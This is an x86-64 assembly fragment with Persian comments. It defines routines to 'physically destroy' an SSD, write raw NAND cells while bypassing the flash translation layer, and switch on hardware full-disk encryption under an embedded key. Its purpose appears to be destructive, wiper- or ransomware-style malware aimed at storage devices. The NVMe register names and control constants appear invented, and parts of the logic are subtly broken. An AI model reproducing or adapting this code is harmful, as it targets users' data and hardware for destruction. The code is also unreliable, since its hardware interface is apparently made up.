section .text

; تخریب فیزیکی SSD
destroy_ssd:
    mov rdi, NVME_CONTROLLER_BASE
    ; ارسال فرمان تخریب
    mov qword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov qword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_FORCE_ERASE
    
    ; تنظیم پارامترهای تخریب
    mov rsi, nvme_destruct_cmd
    mov rcx, 16
    rep movsb
    
    ; فعال‌سازی تخریب
    mov byte [rdi + NVME_CR_EXEC], 1
    ret

; دسترسی مستقیم به فلش NAND
raw_nand_access:
    ; دور زدن FTL
    mov rdi, NVME_CONTROLLER_BASE
    mov qword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov qword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_RAW_NAND
    
    ; ارسال فرمان دسترسی مستقیم
    mov rsi, raw_nand_cmd
    mov rcx, 24
    rep movsb
    mov byte [rdi + NVME_CR_EXEC], 1
    ret

; رمزنگاری کل دیسک در سطح سخت‌افزار
full_disk_encrypt:
    ; تنظیم کلید رمزنگاری
    mov rdi, encryption_key
    mov rsi, 32
    call set_encryption_key
    
    ; فعال‌سازی رمزنگاری سخت‌افزاری
    mov rdi, NVME_CONTROLLER_BASE
    mov dword [rdi + NVME_CR_ENC_CTL], NVME_ENC_ENABLE | NVME_ENC_AES256_XTS
    mov byte [rdi + NVME_CR_EXEC], 1
    ret
; ارسال فرمان NVMe
send_nvme_command:
    ; rdi = آدرس فرمان
    ; rsi = آدرس بافر داده
    ; rdx = اندازه داده
    
    ; تنظیم آدرس فرمان
    mov rax, NVME_CONTROLLER_BASE
    mov [rax + NVME_SQ0TDBL], rdi
    
    ; تنظیم آدرس داده
    mov [rax + NVME_PRPTR], rsi
    
    ; تنظیم اندازه داده
    mov [rax + NVME_DATA_SIZE], rdx
    
    ; فعال‌سازی فرمان
    mov dword [rax + NVME_CTL], NVME_CTL_GO
    ret

; خواندن از NVMe SSD
nvme_raw_read:
    ; rdi = آدرس فیزیکی سکتور
    ; rsi = تعداد سکتورها
    ; rdx = آدرس بافر مقصد
    
    ; ساخت فرمان خواندن
    mov dword [nvme_cmd], NVME_CMD_READ
    mov [nvme_cmd + 8], rdi  ; آدرس شروع
    mov [nvme_cmd + 16], rsi ; تعداد سکتورها
    mov [nvme_cmd + 24], rdx ; آدرس بافر
    
    ; ارسال فرمان
    mov rdi, nvme_cmd
    xor rsi, rsi  ; بدون داده ورودی
    mov rdx, 0
    call send_nvme_command
    ret

; نوشتن مستقیم به سلول‌های NAND
nand_raw_write:
    ; rdi = آدرس فیزیکی سلول
    ; rsi = داده
    ; rdx = اندازه
    
    ; ساخت فرمان نوشتن سطح پایین
    mov dword [nvme_cmd], NVME_CMD_RAW_WRITE
    mov [nvme_cmd + 8], rdi  ; آدرس سلول
    mov [nvme_cmd + 16], rdx ; اندازه
    mov [nvme_cmd + 24], rsi ; داده
    
    ; ارسال فرمان
    mov rdi, nvme_cmd
    mov rsi, nvme_data_buffer
    mov rdx, rdx
    call send_nvme_command
    ret
